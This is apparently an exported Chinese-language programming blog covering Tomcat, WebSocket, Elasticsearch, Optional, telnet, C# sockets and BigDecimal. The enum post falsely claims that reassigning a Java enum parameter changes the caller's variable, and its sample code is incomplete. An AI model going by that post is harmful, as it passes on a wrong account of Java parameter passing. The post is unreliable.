<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Eclipse:</span><br><span class="line">檢查Server Location</span><br><span class="line">Server Path是否設定正確路徑</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>websocket-getAsyncRemote() Versus getBasicRemote()</title>
    <url>/posts/df424b30/</url>
    <content><![CDATA[<h3 id="websocket-getAsyncRemote-Versus-getBasicRemote"><a href="#websocket-getAsyncRemote-Versus-getBasicRemote" class="headerlink" title="websocket-getAsyncRemote() Versus getBasicRemote()"></a>websocket-getAsyncRemote() Versus getBasicRemote()</h3><span id="more"></span>
<p>WebSocket是一種網路傳輸協定，可在單個TCP連接上進行全雙工通訊，位於OSI模型的應用層。<br>WebSocket協定在2011年由IETF標準化為RFC 6455，後由RFC 7936補充規範。Web IDL中的WebSocket API由W3C標準化。</p>
<p>WebSocket使得客戶端和伺服器之間的資料交換變得更加簡單，允許伺服器端主動向客戶端推播資料。<br>在WebSocket API中，瀏覽器和伺服器只需要完成一次交握，兩者之間就可以建立永續性的連接，並進行雙向資料傳輸。</p>
<h3 id="websocket-Session-sendText-有兩種模式"><a href="#websocket-Session-sendText-有兩種模式" class="headerlink" title="websocket Session sendText() 有兩種模式"></a>websocket Session sendText() 有兩種模式</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(1) session.getAsyncRemote().sendText()</span><br><span class="line">	非同步</span><br><span class="line">	可平行處理，一次發送多個</span><br><span class="line">	不在乎順序</span><br><span class="line"></span><br><span class="line">(2) session.getBasicRemote().sendText()</span><br><span class="line">    同步</span><br><span class="line">	第二個要等第一個發送完才繼續發送</span><br></pre></td></tr></table></figure>

<h3 id="session-getBasicRemote-sendText"><a href="#session-getBasicRemote-sendText" class="headerlink" title="session.getBasicRemote().sendText()"></a>session.getBasicRemote().sendText()</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Send a text message <span class="keyword">in</span> parts, blocking until all of the message has been transmitted. The runtime</span><br><span class="line"> * reads the message <span class="keyword">in</span> order. Non-final parts of the message are sent with isLast <span class="built_in">set</span> to <span class="literal">false</span>. The final part</span><br><span class="line"> * must be sent with isLast <span class="built_in">set</span> to <span class="literal">true</span>.</span><br><span class="line"> *</span><br><span class="line"> * @param partialMessage the parts of the message being sent.</span><br><span class="line"> * @param isLast   Whether the partial message being sent is the last part of the message.</span><br><span class="line"> * @throws IOException <span class="keyword">if</span> there is a problem delivering the message fragment.</span><br><span class="line"> * @throws IllegalArgumentException <span class="keyword">if</span> the partialMessage is &#123;@code null&#125;.</span><br><span class="line"> */</span><br><span class="line">void sendText(String partialMessage, boolean isLast) throws IOException;</span><br><span class="line"></span><br><span class="line">exmaple:</span><br><span class="line">session.getBasicRemote().sendText(message, <span class="literal">false</span>); </span><br><span class="line">session.getBasicRemote().sendBinary(data);</span><br><span class="line">session.getBasicRemote().sendText(message, <span class="literal">true</span>); </span><br><span class="line"></span><br><span class="line">由於同步特性，第二行必须等待第一行發送完成後才能進行，而第一行的剩餘message要等第二行</span><br><span class="line">發送完才能繼續發送，所以在第二行會throw IllegalStateException。</span><br><span class="line">如果要使用getBasicRemote()同步sendText，請避免一次發送全部，使用部分發送。</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">大部分的情況請使用非同步session.getAsyncRemote().sendText()方法</span><br><span class="line">有特殊需求要進行部分發送時，請使用session.getBasicRemote().sendText()方法</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat web.xml JSP相關設定</title>
    <url>/posts/bfe7dff3/</url>
    <content><![CDATA[<h3 id="Tomcat-web-xml-JSP相關設定"><a href="#Tomcat-web-xml-JSP相關設定" class="headerlink" title="Tomcat web.xml JSP相關設定"></a>Tomcat web.xml JSP相關設定</h3><span id="more"></span>
<p>這篇介紹在Tomcat的web.xm如何設定與JSP相關的參數。</p>
<h3 id="Tomcat-web-xml"><a href="#Tomcat-web-xml" class="headerlink" title="Tomcat web.xml"></a>Tomcat web.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">	&lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">	&lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;fork&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;!-- Tomcat 8.5 開頭版本預設是1.7，要改1.8才能在JSP使用Java 1.8後語法 --&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;compiler&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;modern&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;compilerSourceVM&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;1.8&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;compilerTargetVM&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;1.8&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;!-- 把JSP編譯成class直接直譯 --&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;suppressSmap&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;<span class="literal">false</span>&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;!-- 丟上JSP之後會自動reload --&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;development&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;<span class="literal">true</span>&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;!-- 記錄完整jsp的debug msg --&gt;</span><br><span class="line">	&lt;init-param&gt;</span><br><span class="line">		&lt;param-name&gt;classdebuginfo&lt;/param-name&gt;</span><br><span class="line">		&lt;param-value&gt;<span class="literal">true</span>&lt;/param-value&gt;</span><br><span class="line">	&lt;/init-param&gt;</span><br><span class="line">	&lt;load-on-startup&gt;3&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>JSP</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Java High Level REST Client操作ElasticSearch</title>
    <url>/posts/408eb7b2/</url>
    <content><![CDATA[<h3 id="使用Java-High-Level-REST-Client操作ElasticSearch"><a href="#使用Java-High-Level-REST-Client操作ElasticSearch" class="headerlink" title="使用Java High Level REST Client操作ElasticSearch"></a>使用Java High Level REST Client操作ElasticSearch</h3><span id="more"></span>
<p>這篇介紹如何用Java High Level REST Client來操作ElasticSearch。</p>
<h3 id="Maven-dependency"><a href="#Maven-dependency" class="headerlink" title="Maven dependency"></a>Maven dependency</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;!-- elasticsearch --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.elasticsearch&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;elasticsearch&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.9.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;elasticsearch-rest-client&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.9.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.elasticsearch.client&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;elasticsearch-rest-high-level-client&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;7.9.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.httpcomponents&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;httpcore&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;4.4.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="連線資訊json"><a href="#連線資訊json" class="headerlink" title="連線資訊json"></a>連線資訊json</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">elk.json</span><br><span class="line">--------</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;host&quot;</span>: <span class="string">&quot;&lt;domain&gt;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&lt;username&gt;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&lt;password&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ELKClient-sample-code"><a href="#ELKClient-sample-code" class="headerlink" title="ELKClient sample code"></a>ELKClient sample code</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public class ELKClient &#123;</span><br><span class="line"></span><br><span class="line">	private static final Logger logger = LoggerFactory.getLogger(ELKClient.class.getSimpleName());</span><br><span class="line"></span><br><span class="line">	private final static int port = 9200;</span><br><span class="line">	public final static int SUCCESS = 1;</span><br><span class="line">	public final static int FAIL = 0;</span><br><span class="line"></span><br><span class="line">	private static ELKClient instance;</span><br><span class="line">	private static Map&lt;?,?&gt; elkSettings;</span><br><span class="line"></span><br><span class="line">	public static ELKClient <span class="function"><span class="title">getInstance</span></span>() &#123;</span><br><span class="line">		<span class="keyword">if</span> (instance == null) &#123;</span><br><span class="line">			synchronized (ELKClient.class) &#123;</span><br><span class="line">				<span class="keyword">if</span> (instance == null) &#123;</span><br><span class="line">					instance = new ELKClient();</span><br><span class="line">					instance.initClient();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private void <span class="function"><span class="title">initClient</span></span>() &#123;</span><br><span class="line">		try&#123;</span><br><span class="line">			InputStream <span class="keyword">in</span> = ELKClient.class.getResourceAsStream(<span class="string">&quot;/elk.json&quot;</span>);</span><br><span class="line">			String json = IOUtils.toString(<span class="keyword">in</span>, StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">			elkSettings = JSONUtils.jsonToInstance(json, Map.class);</span><br><span class="line">			<span class="keyword">if</span> (elkSettings.size() == 0) &#123;</span><br><span class="line">				throw new RuntimeException(<span class="string">&quot;Exception : elk.json setting size: 0&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125; catch (IOException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public RestHighLevelClient <span class="function"><span class="title">getClient</span></span>() &#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			final CredentialsProvider credentialsProvider = new BasicCredentialsProvider();</span><br><span class="line">			credentialsProvider.setCredentials(</span><br><span class="line">				AuthScope.ANY, new UsernamePasswordCredentials(getProperties(<span class="string">&quot;username&quot;</span>), getProperties(<span class="string">&quot;password&quot;</span>)));</span><br><span class="line">			String[] host = getHost().<span class="built_in">split</span>(<span class="string">&quot;://&quot;</span>);</span><br><span class="line">			RestClientBuilder restClientBuilder = RestClient.builder(new HttpHost(host[1], port, host[0]))</span><br><span class="line">				.setHttpClientConfigCallback(httpAsyncClientBuilder -&gt; httpAsyncClientBuilder.setDefaultCredentialsProvider(credentialsProvider));</span><br><span class="line"></span><br><span class="line">			<span class="built_in">return</span> new RestHighLevelClient(restClientBuilder);</span><br><span class="line"></span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			logger.error(e.getMessage(), e);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="update-amp-search-method"><a href="#update-amp-search-method" class="headerlink" title="update &amp; search method"></a>update &amp; search method</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public int update(String indexName, String documentId, Map&lt;String, Object&gt; params) &#123;</span><br><span class="line">	RestHighLevelClient client = null;</span><br><span class="line">	try &#123;</span><br><span class="line">		client = getClient();</span><br><span class="line">		UpdateRequest request = new UpdateRequest(indexName, documentId).doc(params);</span><br><span class="line">		UpdateResponse updateResponse = client.update(request, RequestOptions.DEFAULT);</span><br><span class="line">		<span class="keyword">if</span> (updateResponse.status() == RestStatus.OK) &#123;</span><br><span class="line">			<span class="built_in">return</span> SUCCESS;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		<span class="built_in">return</span> FAIL;</span><br><span class="line">	&#125; finally &#123;</span><br><span class="line">		<span class="keyword">if</span> (client != null) &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				client.close();</span><br><span class="line">			&#125; catch (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> FAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public SearchResponse search(String indexName, String key, String value) &#123;</span><br><span class="line">	RestHighLevelClient client = null;</span><br><span class="line">	try &#123;</span><br><span class="line">		client = getClient();</span><br><span class="line">		SearchRequest searchRequest = new SearchRequest(indexName);</span><br><span class="line">		SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line">		QueryBuilder matchQueryBuilder = QueryBuilders.matchQuery(key, value).operator(</span><br><span class="line">			Operator.AND);</span><br><span class="line">		sourceBuilder.query(matchQueryBuilder);</span><br><span class="line">		searchRequest.<span class="built_in">source</span>(sourceBuilder);</span><br><span class="line">		<span class="built_in">return</span> client.search(searchRequest, RequestOptions.DEFAULT);</span><br><span class="line">	&#125; catch (Exception e) &#123;</span><br><span class="line">		e.printStackTrace();</span><br><span class="line">		<span class="built_in">return</span> null;</span><br><span class="line">	&#125; finally &#123;</span><br><span class="line">		<span class="keyword">if</span> (client != null) &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				client.close();</span><br><span class="line">			&#125; catch (IOException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Optional取代null</title>
    <url>/posts/d37739fb/</url>
    <content><![CDATA[<h3 id="使用Optional取代null"><a href="#使用Optional取代null" class="headerlink" title="使用Optional取代null"></a>使用Optional取代null</h3><span id="more"></span>
<p>JDK8新增了java.util.Optional類別，由於null的根本問題在於含糊而不明確，要避免使用null的方式，<br>就是確認過去使用null的時機與目的，並使用明確的語義。在過去使用null的情況中，開發者於方法中傳回null，<br>通常代表著客戶端必須檢查是否為null，並在null的情況下使用預設值，以便後續程式繼續執行。舉個例子來說：</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>在下方這段程式碼中，如果呼叫getNickName()時忘了檢查null，那麼就會直接顯示null，<br>在這個簡單的例子中並不會怎樣，只是顯示結果令人困惑罷了，但如果後續的執行流程牽涉到至關重要的結果，<br>程式繼續執行下去，錯誤可能到最後才會呈現發生。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">        String nickName = getNickName(<span class="string">&quot;Duke&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (nickName == null) &#123;</span><br><span class="line">            nickName = <span class="string">&quot;Openhome Reader&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(nickName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">static String getNickName(String name) &#123;</span><br><span class="line">	Map&lt;String, String&gt; nickNames = new HashMap&lt;&gt;();</span><br><span class="line">	nickNames.put(<span class="string">&quot;Justin&quot;</span>, <span class="string">&quot;caterpillar&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;momor&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Irene&quot;</span>, <span class="string">&quot;hamimi&quot;</span>);</span><br><span class="line">	<span class="built_in">return</span> nickNames.get(name); // key不存在時會傳回null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="To-revise-example-code-1"><a href="#To-revise-example-code-1" class="headerlink" title="To revise example code 1"></a>To revise example code 1</h3><p>可將getNickName修改使一定會傳回Optional<String>實例，但絕不要傳回null。<br>Optional的語義是它可能包含也可能不包括值，要建立Optional實例有幾個靜態方式，使用of()方法可以指定非null值建立Optional實例，<br>使用empty()方法可以建立不包裏值的Optional實例。<br>例如，可使用Optional來改寫上頭的getNickName()方法：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">static Optional&lt;String&gt; getNickName(String name) &#123;</span><br><span class="line">	Map&lt;String, String&gt; nickNames = new HashMap&lt;&gt;();</span><br><span class="line">	nickNames.put(<span class="string">&quot;Justin&quot;</span>, <span class="string">&quot;caterpillar&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;momor&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Irene&quot;</span>, <span class="string">&quot;hamimi&quot;</span>);</span><br><span class="line">	String nickName = nickNames.get(name);</span><br><span class="line">	<span class="built_in">return</span> nickName == null ? Optional.empty() : Optional.of(nickName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="To-revise-example-code-2"><a href="#To-revise-example-code-2" class="headerlink" title="To revise example code 2"></a>To revise example code 2</h3><p>在Optional沒有包含值的情況下，就會直接拋出java.util.NoSuchElementException，<br>這實現了速錯（Fail fast）的概念，這讓開發者可以立即發現錯誤，並瞭解到必須使用程式碼作些檢查，<br>可能的方式之一像是：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Optional&lt;String&gt; nickOptional = getNickName(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">String nickName = <span class="string">&quot;DC&#x27;blog Reader&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(nickOptional.isPresent()) &#123;</span><br><span class="line">    nickName = nickOptional.get();</span><br><span class="line">&#125;</span><br><span class="line">out.println(nickName);</span><br></pre></td></tr></table></figure>

<p>一個更好的方式可以使用orElse()方法，指定值不存在時的替代值：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Optional&lt;String&gt; nickOptional = getNickName(<span class="string">&quot;David&quot;</span>);</span><br><span class="line">out.println(nickOptional.orElse(<span class="string">&quot;DC&#x27;blog Reader&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>過去許多程式庫中使用了不少null，這些程式庫無法說改就改，可使用Optional的ofNullable()來銜接程式庫中會傳回null的方法，<br>使用ofNullable()方法時，若指定了非null值就會呼叫of()方法，指定了null值就會呼叫empty()方法。<br>例如，先前的getNickName()方法可以更簡潔地修改為：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">static Optional&lt;String&gt; getNickName(String name) &#123;</span><br><span class="line">	Map&lt;String, String&gt; nickNames = new HashMap&lt;&gt;();</span><br><span class="line">	nickNames.put(<span class="string">&quot;Justin&quot;</span>, <span class="string">&quot;caterpillar&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Monica&quot;</span>, <span class="string">&quot;momor&quot;</span>);</span><br><span class="line">	nickNames.put(<span class="string">&quot;Irene&quot;</span>, <span class="string">&quot;hamimi&quot;</span>);</span><br><span class="line">	<span class="built_in">return</span> Optional.ofNullable(nickNames.get(name));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Optional</tag>
      </tags>
  </entry>
  <entry>
    <title>使用telnet連線IP和Port</title>
    <url>/posts/ff4a2f25/</url>
    <content><![CDATA[<h3 id="使用telnet連線IP和Port"><a href="#使用telnet連線IP和Port" class="headerlink" title="使用telnet連線IP和Port"></a>使用telnet連線IP和Port</h3><span id="more"></span>
<p>Telnet是一種應用層協定，可用來連線目的地伺服器的IP和Port。<br>通常用來測試目的地伺服器連線是否通不通，常用telnet指令。</p>
<h3 id="可連線，沒有指定Port就是預設23-port。"><a href="#可連線，沒有指定Port就是預設23-port。" class="headerlink" title="可連線，沒有指定Port就是預設23 port。"></a>可連線，沒有指定Port就是預設23 port。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">telnet 192.168.5.5</span><br><span class="line">Trying 192.168.5.5...</span><br><span class="line">Connected to 192.168.5.5.</span><br><span class="line">Escape character is ‘^]’.</span><br></pre></td></tr></table></figure>

<h3 id="連線不通"><a href="#連線不通" class="headerlink" title="連線不通"></a>連線不通</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">telnet 192.168.5.5</span><br><span class="line">Trying 192.168.5.5...</span><br><span class="line">telnet: connect to address 192.168.5.5: Connection refused</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>telnet</category>
      </categories>
      <tags>
        <tag>TCP/IP</tag>
        <tag>Port</tag>
      </tags>
  </entry>
  <entry>
    <title>傳值參數 使用Enum 優於 基本型別</title>
    <url>/posts/1d230d54/</url>
    <content><![CDATA[<h3 id="傳值參數用Enum優於基本型別"><a href="#傳值參數用Enum優於基本型別" class="headerlink" title="傳值參數用Enum優於基本型別"></a>傳值參數用Enum優於基本型別</h3><span id="more"></span>
<p>傳遞參數時，如果有定義好的Enum可以使用，建議使用Enum。<br>如果沒有定義Enum，才使用Primitives。</p>
<h3 id="Why-傳遞參數Enum-優於-Primitives"><a href="#Why-傳遞參數Enum-優於-Primitives" class="headerlink" title="Why? 傳遞參數Enum 優於 Primitives"></a>Why? 傳遞參數Enum 優於 Primitives</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">定義enum</span><br><span class="line">public enum CategoryType &#123;</span><br><span class="line"></span><br><span class="line">	Home(0) &#123;</span><br><span class="line">	</span><br><span class="line">	&#125;,</span><br><span class="line">	Office(1) &#123;</span><br><span class="line">	</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	private final int unique;</span><br><span class="line">	public int <span class="function"><span class="title">unique</span></span>() &#123;</span><br><span class="line">		<span class="built_in">return</span> unique;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Enum-CallByReference"><a href="#Enum-CallByReference" class="headerlink" title="Enum-CallByReference"></a>Enum-CallByReference</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getXXXByCategory(CategoryType.Home);</span><br><span class="line">public void getXXXByCategory(CategoryType category) &#123;</span><br><span class="line">	//共用同一份記憶體，會改到該方法上一層的category，屬於CallByReference</span><br><span class="line">	category = CategoryType.Office;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Primitives-CallByValue"><a href="#Primitives-CallByValue" class="headerlink" title="Primitives-CallByValue"></a>Primitives-CallByValue</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">getXXXByCategory(CategoryType.Home.unique());</span><br><span class="line">public void getXXXByCategory(int category) &#123;</span><br><span class="line">	//複製一份新的記憶體，不會改到該方法上一層的category，屬於CallByValue</span><br><span class="line">	category = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">不會修改傳遞參數且有定義Enum -&gt; 傳Enum為最佳解</span><br><span class="line">需要修改傳遞參數 -&gt; 不建議用Enum，改用Primitives</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Enum</tag>
        <tag>Primitives</tag>
      </tags>
  </entry>
  <entry>
    <title>判斷Socket連線是否斷線</title>
    <url>/posts/c07f118/</url>
    <content><![CDATA[<h3 id="判斷Socket連線是否斷線"><a href="#判斷Socket連線是否斷線" class="headerlink" title="判斷Socket連線是否斷線"></a>判斷Socket連線是否斷線</h3><span id="more"></span>
<p>這篇介紹在TCP&#x2F;IP Protocol中，C#如何偵測Socket是否斷線。</p>
<h3 id="Socket-Connected"><a href="#Socket-Connected" class="headerlink" title="Socket.Connected"></a>Socket.Connected</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Socket.Connected檢查連線狀態，但若在測試時直接關閉連線或結束程式，程式並不會偵測到已經斷線的事實!</span><br><span class="line"></span><br><span class="line">Connected 屬性會取得上次 I/O 作業的 Client 通訊端連接狀態。當它傳回 <span class="literal">false</span> 時，即表示 Client 通訊端不是從未連接過，就是不再連接了。</span><br><span class="line"></span><br><span class="line">因為 Connected 屬性只反映最近一次作業的連接狀態，所以您應嘗試傳送或接收訊息，以判斷目前的狀態。</span><br><span class="line">訊息傳送失敗之後，這個屬性就不再傳回 <span class="literal">true</span>。請注意，這種行為是設計上的預期行為。您可能無法很穩定地測試連接的狀態，</span><br><span class="line">原因是有可能在測試和收發 (訊息) 之間就失去該連接。您的程式碼應假設該通訊端是連接的，然後再小心處理傳輸失敗的情況。</span><br></pre></td></tr></table></figure>

<h3 id="socket-Poll-and-SocketFlags-Peek-example"><a href="#socket-Poll-and-SocketFlags-Peek-example" class="headerlink" title="socket.Poll and SocketFlags.Peek example"></a>socket.Poll and SocketFlags.Peek example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (socket.Connected &amp;&amp; !checkSocketConnection(socket))</span><br><span class="line">&#123;</span><br><span class="line">	//To Do Something</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public bool checkSocketConnection(Socket socket)</span><br><span class="line">&#123;</span><br><span class="line">	bool closed = <span class="literal">false</span>;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		//使用Peek測試連線是否仍存在</span><br><span class="line">		<span class="keyword">if</span> (socket.Poll(0, SelectMode.SelectRead))</span><br><span class="line">			closed = socket.Receive(new byte[1], SocketFlags.Peek) == 0;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (SocketException ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Info(<span class="string">&quot;(EndRead)checkSocketConnection SocketException&quot;</span> + ex.ToString());</span><br><span class="line">		closed = <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> closed;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Socket</tag>
      </tags>
  </entry>
  <entry>
    <title>在Java將double轉型BigDecimal注意事項</title>
    <url>/posts/19d9c492/</url>
    <content><![CDATA[<h3 id="在Java將double轉型BigDecimal注意事項"><a href="#在Java將double轉型BigDecimal注意事項" class="headerlink" title="在Java將double轉型BigDecimal注意事項"></a>在Java將double轉型BigDecimal注意事項</h3><span id="more"></span>
<p>這篇介紹在Java將double轉型BigDecimal注意事項。</p>
<h3 id="incorrect-Example"><a href="#incorrect-Example" class="headerlink" title="incorrect Example"></a>incorrect Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">float</span> a = 57.3f;</span><br><span class="line"></span><br><span class="line">BigDecimal decimalA = new BigDecimal(a);</span><br><span class="line"></span><br><span class="line">System.out.println(decimalA);</span><br><span class="line"></span><br><span class="line">Output:57.299999237060546875</span><br><span class="line"></span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">double b = 57.3;</span><br><span class="line"></span><br><span class="line">BigDecimal decimalB = new BigDecimal(b);</span><br><span class="line"></span><br><span class="line">System.out.println(decimalB);</span><br><span class="line"></span><br><span class="line">Output:57.2999999999999971578290569595992565155029296875</span><br><span class="line"></span><br><span class="line">結論:避免直接使用new BigDecimal(double) or new BigDecimal(<span class="built_in">float</span>)</span><br></pre></td></tr></table></figure>

